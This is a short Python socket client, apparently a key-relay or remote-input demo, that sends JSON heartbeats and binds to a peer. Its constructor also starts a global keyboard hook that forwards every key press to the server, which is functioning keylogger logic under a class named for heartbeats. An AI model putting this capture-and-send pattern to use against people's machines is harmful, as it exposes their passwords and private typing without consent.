import socket
import json
import threading
import time
from pynput import keyboard


class HeartbeatClient:
    def __init__(self, host, port, cid):
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client_socket.connect((host, port))
        self.running = True

        self.cid = cid

        self.listener = keyboard.Listener(on_press=self.on_key_press)
        self.listener.start()

    def send_heartbeat(self):
        """定时发送心跳包"""
        while self.running:
            try:
                heartbeat_packet = {
                    "cmd": "heartBeat",
                    "from": self.cid,
                    "seq": int(time.time())  # 使用时间戳作为序列号
                }
                self.client_socket.sendall((json.dumps(heartbeat_packet) + "\n").encode('utf-8'))
                print("Heartbeat sent")
                time.sleep(30)  # 每30秒发送一次心跳
            except Exception as e:
                print(f"Error sending heartbeat: {e}")
                break

    def receive_messages(self):
        """持续接收服务器消息"""
        buffer = ""  # 用于存储接收到的数据
        while self.running:
            try:
                data = self.client_socket.recv(1024)
                if data:
                    # 将接收到的数据添加到缓冲区
                    buffer += data.decode('utf-8')
                    
                    # 按行分割消息
                    while '\n' in buffer:
                        line, buffer = buffer.split('\n', 1)
                        if line:
                            print(f"Received: {line}")
                            # 如果需要处理JSON数据，可以在这里解析
                            # packet = json.loads(line)
                            # 处理服务器的心跳确认
                            # if packet.get('cmd') == 'heartBeat':
                            #     print(f"Server acknowledged: {packet.get('data')}")
                else:
                    # 服务器关闭连接
                    break
            except Exception as e:
                print(f"Error receiving message: {e}")
                break

    def bind(self, target):
        """绑定客户端"""
        heartbeat_packet = {
            "cmd": "bind",
            "from": self.cid,
            "to": target,
            "seq": int(time.time())  # 使用时间戳作为序列号
        }
        self.client_socket.sendall((json.dumps(heartbeat_packet) + "\n").encode('utf-8'))
        print("Heartbeat sent")


    def start(self):
        """启动客户端"""
        # 启动心跳线程
        heartbeat_thread = threading.Thread(target=self.send_heartbeat)
        heartbeat_thread.daemon = True
        heartbeat_thread.start()

        # 主线程用于接收消息
        self.receive_messages()

    def stop(self):
        """停止客户端"""
        self.running = False
        self.client_socket.close()


    def on_key_press(self, _key):
        # 将 Key 对象转换为可序列化的字符串
        if isinstance(_key, keyboard.Key):
            key_value = _key.name
        else:
            key_value = _key.char

        heartbeat_packet = {
            "cmd": "send",
            "from": self.cid,
            "seq": int(time.time()),  # 使用时间戳作为序列号
            "body": key_value
        }
        self.client_socket.send((json.dumps(heartbeat_packet) + "\n").encode('utf-8'))


# 使用示例
if __name__ == "__main__":
    client = HeartbeatClient('localhost', 9000, "1")
    try:
        client.bind("2")
        client.start()
    except KeyboardInterrupt:
        print("Stopping client...")
        client.stop()
